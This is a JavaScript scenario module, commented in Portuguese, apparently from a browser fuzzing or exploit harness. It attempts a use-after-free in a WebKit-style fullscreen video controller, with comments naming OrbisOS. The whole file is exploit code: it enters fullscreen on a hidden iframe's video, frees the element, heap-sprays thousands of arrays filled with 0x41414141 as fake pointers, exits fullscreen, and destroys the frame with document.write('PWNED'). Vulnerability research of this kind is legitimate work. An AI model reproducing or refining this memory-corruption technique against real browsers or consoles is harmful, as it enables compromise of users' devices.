/**
 * CENÁRIO: VIDEO_FULLSCREEN_REMOVE (The Leandro's Blueprint)
 * Alvo: FullscreenVideoController + FrameLoader Teardown
 */

export default {
    id:       'VIDEO_FULLSCREEN_REMOVE',
    category: 'Media',
    risk:     'CRITICAL',
    description: 'Usa a entrada Fullscreen padrão (automática no fuzzer) combinada com ' +
                 'o teardown letal de 500ms via document.write para forçar o UAF no C++.',

    setup: async function() {
        // O Iframe invisível para conter a explosão do document.write
        this.iframe = document.createElement('iframe');
        this.iframe.setAttribute('allowfullscreen', 'true');
        this.iframe.style.opacity = '0.01';
        document.body.appendChild(this.iframe);

        const doc = this.iframe.contentDocument;
        this.video = doc.createElement('video');
        this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDIAAAAIZnJlZQAAAAhtZGF0';
        doc.body.appendChild(this.video);

        // O nosso payload de Spray (0x41414141)
        this.sprayPayload = new Uint32Array(256);
        this.sprayPayload.fill(0x41414141);

        await new Promise(resolve => {
            const timeout = setTimeout(resolve, 400);
            this.video.addEventListener('loadedmetadata', () => {
                clearTimeout(timeout);
                resolve();
            }, { once: true });
        });
    },

    trigger: async function() {
        try {
            // 1. ENTRADA (A que funcionava): API DOM padrão.
            // O fuzzer consegue disparar isto automaticamente sem bloquear a tela.
            if (this.video.webkitRequestFullscreen) {
                this.video.webkitRequestFullscreen();
            }

            // 2. A SUA TÁTICA: 500ms de espera.
            // O tempo exato para o OrbisOS alocar as superfícies gráficas.
            await new Promise(r => setTimeout(r, 500));

            // 3. FREE: Apagamos o vídeo da memória do DOM
            this.video.remove();

            // 4. SPRAY: Inundamos o buraco com ponteiros falsos
            this.spray = [];
            for (let i = 0; i < 5000; i++) {
                let arr = new Uint32Array(256);
                arr.set(this.sprayPayload);
                this.spray.push(arr);
            }

            // 5. USE (A SAÍDA): Acionamos o controlador C++ para tentar 
            // modificar o vídeo que acabámos de apagar e substituir.
            if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            }

            // 6. O GATILHO FATAL: Destruição do contexto.
            // O document.write aniquila o FrameLoader enquanto o C++ 
            // ainda tenta processar a saída do Fullscreen.
            setTimeout(() => {
                try {
                    this.iframe.contentDocument.write('PWNED');
                    this.iframe.contentDocument.close();
                } catch(e) {}
            }, 100);

        } catch(e) {}
    },

    probe: [
        s => s.video.readyState,
        s => s.video.webkitDecodedFrameCount,
        s => { try { return s.video.buffered.start(0); } catch(e) { return e.name; } }
    ],

    cleanup: function() {
        try { this.iframe.remove(); } catch(e) {}
        this.spray = null;
        this.video = null;
    }
};
